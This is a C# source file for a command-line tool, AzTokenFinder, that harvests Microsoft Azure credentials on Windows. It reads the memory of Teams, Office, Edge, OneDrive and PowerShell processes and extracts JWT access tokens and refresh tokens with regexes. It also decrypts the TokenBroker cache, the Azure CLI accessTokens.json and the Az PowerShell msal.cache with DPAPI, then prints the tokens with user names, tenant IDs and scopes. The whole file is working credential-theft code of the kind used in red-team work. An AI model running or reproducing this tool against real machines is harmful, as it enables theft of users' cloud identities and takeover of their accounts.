using CommandLine;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IdentityModel.Tokens.Jwt;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.Json;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace AzTokenFinder
{

    // Credits to: https://codingvision.net/c-how-to-scan-a-process-memory
    internal class Program
    {
        // REQUIRED CONSTS
        const int PROCESS_QUERY_INFORMATION = 0x0400;
        const int MEM_COMMIT = 0x00001000;
        const int PAGE_READWRITE = 0x04;
        const int PROCESS_WM_READ = 0x0010;

        // REQUIRED METHODS
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int dwSize, ref int lpNumberOfBytesRead);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern void GetSystemInfo(out SYSTEM_INFO lpSystemInfo);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int VirtualQueryEx(IntPtr hProcess, IntPtr lpAddress, out MEMORY_BASIC_INFORMATION lpBuffer, uint dwLength);

        // REQUIRED STRUCTS
        [StructLayout(LayoutKind.Sequential)]
        public struct MEMORY_BASIC_INFORMATION
        {
            public ulong BaseAddress;
            public ulong AllocationBase;
            public int AllocationProtect;
            public int __alignment1;
            public ulong RegionSize;
            public int State;
            public int Protect;
            public int Type;
            public int __alignment2;
        }

        public struct SYSTEM_INFO
        {
            public ushort processorArchitecture;
            ushort reserved;
            public uint pageSize;
            public IntPtr minimumApplicationAddress;
            public IntPtr maximumApplicationAddress;
            public IntPtr activeProcessorMask;
            public uint numberOfProcessors;
            public uint processorType;
            public uint allocationGranularity;
            public ushort processorLevel;
            public ushort processorRevision;
        }

        private static String STARTOFJWT = "eyJ0";
        private static String JWTREGEX = @"eyJ[A-Za-z0-9-_=]+\.eyJ[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*";
        private static String STARTOFREFRESHTOKEN = "0.AY";
        private static String REFRESHTOKENREGEX = @"0.AY[A-Za-z0-9-_.+/=]*";
        private static String[] DefaultProcess = new string[] { "teams", "powerpnt", "winword", "onedrive", "msedge", "excel", "powershell" };

        static List<String> FindJWT(String input)
        {
            if (!input.Contains(STARTOFJWT))
            {
                return null;
            }

            List<string> result = new List<string>();
            Regex rg = new Regex(JWTREGEX);
            MatchCollection potentialJWTs = rg.Matches(input);
            for (int count = 0; count < potentialJWTs.Count; count++)
            {
                String jwtToTest = potentialJWTs[count].Value;
                JwtSecurityToken jwtToken = null;
                try
                {
                    // Check if could parse to Azure Token
                    jwtToken = new JwtSecurityToken(jwtToTest);
                }
                catch
                {
                    // Console.WriteLine("[-] Failed parsing tokens.");
                    continue;
                }

                if (!result.Contains(jwtToTest))
                {
                    result.Add(jwtToTest);
                }
            }
            return result;
        }

        static List<String> FindRefrehsToken(String input)
        {
            if (!input.Contains(STARTOFREFRESHTOKEN))
            {
                return null;
            }

            List<string> result = new List<string>();
            Regex rg = new Regex(REFRESHTOKENREGEX);
            MatchCollection potentialRefreshTokens = rg.Matches(input);
            for (int count = 0; count < potentialRefreshTokens.Count; count++)
            {
                String refreshTokenValue = potentialRefreshTokens[count].Value;
                if (!result.Contains(refreshTokenValue))
                {
                    result.Add(refreshTokenValue);
                }
            }
            return result;
        }

        static Tuple<List<String>, List<String>> GetAzureTokenFromProcess(int processID)
        {
            List<String> AzureJWT = new List<string>();
            List<String> RefreshTokens = new List<string>();
            SYSTEM_INFO sys_info = new SYSTEM_INFO();
            GetSystemInfo(out sys_info);

            ulong proc_min_address = (ulong)sys_info.minimumApplicationAddress;
            ulong proc_max_address = (ulong)sys_info.maximumApplicationAddress;

            // opening the process with desired access level
            IntPtr processHandle = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_WM_READ, false, processID);
            //Console.WriteLine("OpenProcess: " + Marshal.GetLastWin32Error());

            MEMORY_BASIC_INFORMATION mem_basic_info = new MEMORY_BASIC_INFORMATION();

            int bytesRead = 0;

            while (proc_min_address < proc_max_address)
            {
                // 28 = sizeof(MEMORY_BASIC_INFORMATION)
                VirtualQueryEx(processHandle, (IntPtr)proc_min_address, out mem_basic_info, (uint)Marshal.SizeOf(typeof(MEMORY_BASIC_INFORMATION)));
                //Console.WriteLine("VirtualQueryEx: " + Marshal.GetLastWin32Error());

                // if this memory chunk is accessible
                if (mem_basic_info.Protect == PAGE_READWRITE && mem_basic_info.State == MEM_COMMIT)
                {
                    byte[] buffer = new byte[mem_basic_info.RegionSize];

                    // read everything in the buffer above
                    ReadProcessMemory(processHandle, (IntPtr)mem_basic_info.BaseAddress, buffer, (int)mem_basic_info.RegionSize, ref bytesRead);
                    bool inString = false;
                    ulong startOfString = 0;
                    ulong endOfString = 0;
                    char[] currentStringAsChar;
                    String currentString;

                    for (ulong i = 0; i < mem_basic_info.RegionSize; i++)
                    {
                        if (buffer[i] != 0 && inString == false)
                        {
                            startOfString = i;
                            endOfString = i;
                            inString = true;
                        }
                        else if (buffer[i] != 0 && inString)
                        {
                            endOfString = i;
                        }
                        else if (buffer[i] == 0 && inString)
                        {
                            endOfString = i;
                            // Only looking for long strings
                            if (endOfString - startOfString > 20)
                            {
                                currentStringAsChar = new char[endOfString - startOfString];
                                Array.Copy(buffer, (int)startOfString, currentStringAsChar, 0, (int)(endOfString - startOfString));
                                currentString = new string(currentStringAsChar);
                                List<String> currentJWT = FindJWT(currentString);
                                if (currentJWT != null)
                                {
                                    foreach (String jWT in currentJWT)
                                    {
                                        if (!AzureJWT.Contains(jWT))
                                        {
                                            AzureJWT.Add(jWT);
                                        }
                                    }
                                }

                                List<String> currentRefrehsTokens = FindRefrehsToken(currentString);
                                if (currentRefrehsTokens != null)
                                {
                                    foreach (String refreshToken in currentRefrehsTokens)
                                    {
                                        if (!RefreshTokens.Contains(refreshToken))
                                        {
                                            RefreshTokens.Add(refreshToken);
                                        }
                                    }
                                }
                            }
                            inString = false;
                        }
                        else { }
                    }
                }

                // move to the next memory chunk
                proc_min_address += mem_basic_info.RegionSize;
            }
            return Tuple.Create(AzureJWT, RefreshTokens);
        }
        static void Main(string[] args)
        {

            CommandLine.Parser.Default.ParseArguments<Options>(args).WithParsed(RunOptions).WithNotParsed(HandleParseError);
        }

        static void RunOptions(Options opts)
        {
            List<string> AccessTokensResult = new List<string>();
            List<string> RefreshTokensResult = new List<string>();
            List<Tuple<string,string>> AccessRefreshTokenPairResult = new List<Tuple<string, string>>();
            if (opts.Mode.ToLower() != "online" & opts.Mode.ToLower() != "offline")
            {
                Console.WriteLine("[-] Use --mode online or --mode offline");
                return;
            }
            else if (opts.Mode.ToLower() == "online")
            {
                if (opts.ProcessIDs.Count() == 0 && opts.ProcessNames.Count() == 0 && !opts.Default)
                {
                    Console.WriteLine("[-] Not the correct arguments, please use --help.");
                    return;
                }


                if (opts.Default)
                {
                    Console.WriteLine("[+] Starting with default processes.");
                    foreach (String name in DefaultProcess)
                    {
                        Process[] processes = Process.GetProcessesByName(name);
                        if (processes.Length == 0)
                        {
                            Console.WriteLine("[-] No process with the given name {0} found.", name);
                        }
                        else
                        {
                            foreach (Process process in processes)
                            {
                                Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
                                Tuple<List<String>, List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
                                List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
                                if (AzureTokens == null || AzureTokens.Count == 0)
                                {
                                    Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                    foreach (string token in AzureTokens)
                                    {
                                        if (!AccessTokensResult.Contains(token))
                                        {
                                            AccessTokensResult.Add(token);
                                        }
                                    }
                                }

                                List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
                                if (FreshTokens == null || FreshTokens.Count == 0)
                                {
                                    Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                    foreach (string token in FreshTokens)
                                    {
                                        if (!RefreshTokensResult.Contains(token))
                                        {
                                            RefreshTokensResult.Add(token);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (opts.ProcessNames != null)
                {
                    foreach (String name in opts.ProcessNames)
                    {
                        Process[] processes = Process.GetProcessesByName(name);
                        if (processes.Length == 0)
                        {
                            Console.WriteLine("[-] No process with the given name found.");
                        }
                        else
                        {
                            foreach (Process process in processes)
                            {
                                Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
                                Tuple<List<String>, List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
                                List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
                                if (AzureTokens == null || AzureTokens.Count == 0)
                                {
                                    Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                    foreach (string token in AzureTokens)
                                    {
                                        if (!AccessTokensResult.Contains(token))
                                        {
                                            AccessTokensResult.Add(token);
                                        }
                                    }
                                }

                                List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
                                if (FreshTokens == null || FreshTokens.Count == 0)
                                {
                                    Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                                }
                                else
                                {
                                    Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                    foreach (string token in FreshTokens)
                                    {
                                        if (!RefreshTokensResult.Contains(token))
                                        {
                                            RefreshTokensResult.Add(token);
                                        }
                                    }
                                }
                            }
                        }
                    }
                }

                if (opts.ProcessIDs != null)
                {
                    foreach (int id in opts.ProcessIDs)
                    {
                        Process process = Process.GetProcessById(id);
                        if (process == null)
                        {
                            Console.WriteLine("[-] Process could not be found...");
                        }
                        else
                        {
                            Console.WriteLine("[+] Checking process {0} with processid {1}.", process.ProcessName, process.Id);
                            Tuple<List<String>, List<String>> AzureTokensAndRefreshTokens = GetAzureTokenFromProcess(process.Id);
                            List<String> AzureTokens = AzureTokensAndRefreshTokens.Item1;
                            if (AzureTokens == null || AzureTokens.Count == 0)
                            {
                                Console.WriteLine("[-] No AccessTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                            }
                            else
                            {
                                Console.WriteLine("[+] {0} AccessTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                foreach (string token in AzureTokens)
                                {
                                    if (!AccessTokensResult.Contains(token))
                                    {
                                        AccessTokensResult.Add(token);
                                    }
                                }
                            }

                            List<String> FreshTokens = AzureTokensAndRefreshTokens.Item2;
                            if (FreshTokens == null || FreshTokens.Count == 0)
                            {
                                Console.WriteLine("[-] No RefreshTokens for process {0} with processid {1} found.", process.ProcessName, process.Id.ToString());
                            }
                            else
                            {
                                Console.WriteLine("[+] {0} RefreshTokens found in process {1} with processid {2}!", AzureTokens.Count.ToString(), process.ProcessName, process.Id);
                                foreach (string token in FreshTokens)
                                {
                                    if (!RefreshTokensResult.Contains(token))
                                    {
                                        RefreshTokensResult.Add(token);
                                    }
                                }
                            }
                        }

                    }
                }
            }
            else if (opts.Mode.ToLower() == "offline")
            {
                if(opts.targetapp == null)
                {
                    Console.WriteLine("[-] Please provide a target or use --help to get more information.");
                    return;
                }

                if (opts.Filename != null)
                {
                    string content = File.ReadAllText(opts.Filename, Encoding.Unicode);
                    // Remove last null byte
                    content = content.Remove(content.Length - 1);
                    try
                    {
                        TBStorageObject obj = System.Text.Json.JsonSerializer.Deserialize<TBStorageObject>(content);
                        string dpapiData = obj.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;
                        byte[] decryptedData = DPAPIDecryptBase64(dpapiData);
                        List<String> longerStrings = FindStringInByte(decryptedData);

                        foreach (String DATA in longerStrings)
                        {
                            List<String> jwts = FindJWT(DATA);
                            if (jwts != null)
                            {
                                foreach (String JWT in jwts)
                                {
                                    if (!AccessTokensResult.Contains(JWT))
                                    {
                                        AccessTokensResult.Add(JWT);
                                    }
                                }
                            }
                        }
                    }
                    catch
                    {
                        Console.WriteLine("[-] Could not parse file. Aborting...");
                        return;
                    }
                }
                else if (opts.targetapp.ToLower() == "office")
                {
                    String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string[] filesInCache = Directory.GetFiles(LocalAppDataPAth + @"\\Microsoft\\TokenBroker\\Cache");
                    foreach (string file in filesInCache)
                    {
                        string content = File.ReadAllText(file, Encoding.Unicode);
                        // Remove last null byte
                        content = content.Remove(content.Length - 1);
                        try
                        {
                            TBStorageObject obj = System.Text.Json.JsonSerializer.Deserialize<TBStorageObject>(content);
                            string dpapiData = obj.TBDataStoreObject.ObjectData.SystemDefinedProperties.ResponseBytes.Value;
                            byte[] decryptedData = DPAPIDecryptBase64(dpapiData);
                            List<String> longerStrings = FindStringInByte(decryptedData);

                            foreach (String DATA in longerStrings)
                            {
                                List<String> jwts = FindJWT(DATA);
                                if (jwts != null)
                                {
                                    foreach (String JWT in jwts)
                                    {
                                        if (!AccessTokensResult.Contains(JWT))
                                        {
                                            AccessTokensResult.Add(JWT);
                                        }
                                    }
                                }
                            }
                        }
                        catch
                        {
                            continue;
                        }
                    }

                }
                else if (opts.targetapp.ToLower() == "azcli")
                {
                    String UserProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                    string content = File.ReadAllText(UserProfile + @"\\.Azure\\accessTokens.json", Encoding.Default);
                    dynamic datas = JsonConvert.DeserializeObject(content);
                    foreach(var data in datas)
                    {
                        if(data.accessToken != null & data.refreshToken != null)
                        {
                            AccessRefreshTokenPairResult.Add(new Tuple<string, string>(data.accessToken.ToString(), data.refreshToken.ToString()));
                        }
                        else
                        {
                            if(data.accessToken != null)
                            {
                                AccessTokensResult.Add(data.accessToken);
                            }
                            if(data.refreshToken != null)
                            {
                                RefreshTokensResult.Add(data.refreshToken);
                            }
                        }
                    }
                }
                else if (opts.targetapp.ToLower() == "azpwsh")
                {
                    String LocalAppDataPAth = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                    string content = File.ReadAllText(LocalAppDataPAth + @"\\.IdentityService\\msal.cache", Encoding.Default);
                    // Remove last null byte
                    //content = content.Remove(content.Length - 1);
                    byte[] decryptedData = DPAPIDecrypt(content);
                    String decryptedContent = Encoding.Default.GetString(decryptedData);
                    dynamic data = JsonConvert.DeserializeObject(decryptedContent);
                    if(data.AccessToken != null){
                        var accessToken = data.AccessToken;
                        foreach (var elem in accessToken)
                        {
                            if (elem.Count > 0)
                            {
                                foreach (var item in elem)
                                {
                                    if (item.secret != null)
                                    {
                                        AccessTokensResult.Add(item.secret.ToString());
                                    }
                                }
                            }
                        }
                        
                    }

                    if (data.RefreshToken != null)
                    {
                        var refreshToken = data.RefreshToken;
                        foreach(var elem in refreshToken)
                        {
                            if (elem.Count > 0)
                            {
                                foreach (var item in elem)
                                {
                                    if (item.secret != null)
                                    {
                                        RefreshTokensResult.Add(item.secret.ToString());
                                    }
                                }
                            }
                        }
                    }
                }
            }
            else
            {
                Console.WriteLine("[-] This should not happen");
                return;
            }

            if (AccessTokensResult.Count == 0)
            {
                Console.WriteLine("[-] No tokens found sorry.");
            }
            else
            {
                if (opts.ShowExpiredTokens)
                {
                    Console.WriteLine("[+] Finish!. Found {0} potential AccessTokens.", AccessTokensResult.Count);
                }
                else
                {
                    Console.WriteLine("[+] Finish!. Found {0} potential AccessTokens. Showing only not expired tokens.", AccessTokensResult.Count);
                }

                Console.WriteLine();
                Console.WriteLine("==========================================================");
                foreach (string token in AccessTokensResult)
                {
                    JwtSecurityToken parsedToken = new JwtSecurityToken(token);
                    if (parsedToken.Payload != null)
                    {
                        if (parsedToken.Payload.ContainsKey("exp"))
                        {
                            try
                            {
                                long exp = (long)parsedToken.Payload["exp"];
                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                                if (!opts.ShowExpiredTokens)
                                {
                                    if (DateTimeOffset.UtcNow > TokenExpireTime)
                                    {
                                        continue;
                                    }
                                }

                            }
                            catch { }
                        }
                        else
                        {
                            if (!opts.ShowExpiredTokens)
                            {
                                continue;
                            }
                        }
                        if (parsedToken.Payload.ContainsKey("upn"))
                        {
                            Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
                        }
                        if (parsedToken.Payload.ContainsKey("name"))
                        {
                            Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
                        }
                        if (parsedToken.Payload.ContainsKey("preferred_username"))
                        {
                            Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
                        }
                        if (parsedToken.Payload.ContainsKey("tid"))
                        {
                            Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
                        }
                        if (parsedToken.Audiences.Count() > 0)
                        {
                            Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
                        }
                        if (parsedToken.Payload.ContainsKey("scp"))
                        {
                            Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
                        }
                        if (parsedToken.Payload.ContainsKey("appid"))
                        {
                            Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
                        }
                        if (parsedToken.Payload.ContainsKey("exp"))
                        {
                            try
                            {
                                long exp = (long)parsedToken.Payload["exp"];
                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                                Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
                            }
                            catch { }
                        }

                        Console.WriteLine();
                        Console.WriteLine(token);
                        Console.WriteLine("==========================================================");
                    }
                }
            }

            
            if (RefreshTokensResult.Count() == 0)
            {
                Console.WriteLine("[-] Nothing found looking like a RefreshToken... sorry");
            }
            else
            {
                Console.WriteLine();
                Console.WriteLine("[+] Found {0} Refresh Token.", RefreshTokensResult.Count().ToString());

                Console.WriteLine();
                Console.WriteLine("==========================================================");
                Console.WriteLine();

                foreach (String refreshToken in RefreshTokensResult)
                {
                    Console.WriteLine(refreshToken);
                    Console.WriteLine();
                    Console.WriteLine("==========================================================");
                }
            }

            if(AccessRefreshTokenPairResult.Count() > 0)
            {
                foreach (Tuple<string,string> entry in AccessRefreshTokenPairResult)
                {
                    JwtSecurityToken parsedToken = new JwtSecurityToken(entry.Item1);
                    bool isExpired = false;
                    if (parsedToken.Payload != null)
                    {
                        if (parsedToken.Payload.ContainsKey("exp"))
                        {
                            try
                            {
                                long exp = (long)parsedToken.Payload["exp"];
                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                                if (!opts.ShowExpiredTokens)
                                {
                                    if (DateTimeOffset.UtcNow > TokenExpireTime)
                                    {
                                        isExpired = true;
                                    }
                                }

                            }
                            catch { }
                        }
                        else
                        {
                            if (!opts.ShowExpiredTokens)
                            {
                                continue;
                            }
                        }
                        if (parsedToken.Payload.ContainsKey("upn"))
                        {
                            Console.WriteLine("UPN: {0}", parsedToken.Payload["upn"]);
                        }
                        if (parsedToken.Payload.ContainsKey("name"))
                        {
                            Console.WriteLine("Name: {0}", parsedToken.Payload["name"]);
                        }
                        if (parsedToken.Payload.ContainsKey("preferred_username"))
                        {
                            Console.WriteLine("Preferred Username: {0}", parsedToken.Payload["preferred_username"]);
                        }
                        if (parsedToken.Payload.ContainsKey("tid"))
                        {
                            Console.WriteLine("Tenant ID: {0}", parsedToken.Payload["tid"]);
                        }
                        if (parsedToken.Audiences.Count() > 0)
                        {
                            Console.WriteLine("Audience: {0}", parsedToken.Audiences.First());
                        }
                        if (parsedToken.Payload.ContainsKey("scp"))
                        {
                            Console.WriteLine("Scope: {0}", parsedToken.Payload["scp"]);
                        }
                        if (parsedToken.Payload.ContainsKey("appid"))
                        {
                            Console.WriteLine("AppID: {0}", parsedToken.Payload["appid"]);
                        }
                        if (parsedToken.Payload.ContainsKey("exp"))
                        {
                            try
                            {
                                long exp = (long)parsedToken.Payload["exp"];
                                DateTimeOffset TokenExpireTime = DateTimeOffset.FromUnixTimeSeconds(exp);
                                Console.WriteLine("Expires on: {0}", TokenExpireTime.LocalDateTime);
                            }
                            catch { }
                        }

                        Console.WriteLine();
                        Console.WriteLine(entry.Item1);
                        Console.WriteLine();
                        if (isExpired)
                        {
                            Console.WriteLine("JWT is expired, get a new one with the RefreshToken.");
                            Console.WriteLine();
                        }
                        Console.WriteLine(entry.Item2);
                        Console.WriteLine();
                        Console.WriteLine("==========================================================");
                    }
                }
            }
        }

        // Reference: https://codingvision.net/c-safe-encryption-decryption-using-dpapi
        public static byte[] DPAPIDecryptBase64(string text)
        {
            // the encrypted text, converted to byte array 
            byte[] encryptedText = Convert.FromBase64String(text);

            // calling Unprotect() that returns the original text 
            byte[] originalText = ProtectedData.Unprotect(encryptedText, null, DataProtectionScope.CurrentUser);

            // finally, returning the result 
            //return Encoding.Default.GetString(originalText);
            return originalText;
        }

        public static byte[] DPAPIDecrypt(string text)
        {
            byte[] encryptedText = Encoding.Default.GetBytes(text);
            // calling Unprotect() that returns the original text 
            byte[] originalText = ProtectedData.Unprotect(encryptedText, null, DataProtectionScope.CurrentUser);

            // finally, returning the result 
            //return Encoding.Default.GetString(originalText);
            return originalText;
        }

        public static List<String> FindStringInByte(byte[] data)
        {
            bool inString = false;
            ulong startOfString = 0;
            ulong endOfString = 0;
            char[] currentStringAsChar;
            String currentString;
            List<String> result = new List<String>();

            for (ulong i = 0; i < Convert.ToUInt64(data.Length); i++)
            {
                if (data[i] != 0 && inString == false)
                {
                    startOfString = i;
                    endOfString = i;
                    inString = true;
                }
                else if (data[i] != 0 && inString)
                {
                    endOfString = i;
                }
                else if (data[i] == 0 && inString)
                {
                    endOfString = i;
                    // Only looking for long strings
                    if (endOfString - startOfString > 20)
                    {
                        currentStringAsChar = new char[endOfString - startOfString];
                        Array.Copy(data, (int)startOfString, currentStringAsChar, 0, (int)(endOfString - startOfString));
                        currentString = new string(currentStringAsChar);
                        if (!result.Contains(currentString))
                        {
                            result.Add(currentString);
                        }
                    }
                    inString = false;
                }
                else { }
            }
            return result;
        }

        static void HandleParseError(IEnumerable<Error> errs)
        {
            Console.WriteLine("[-] Not the correct arguments, please use --help.");
        }
    }
}
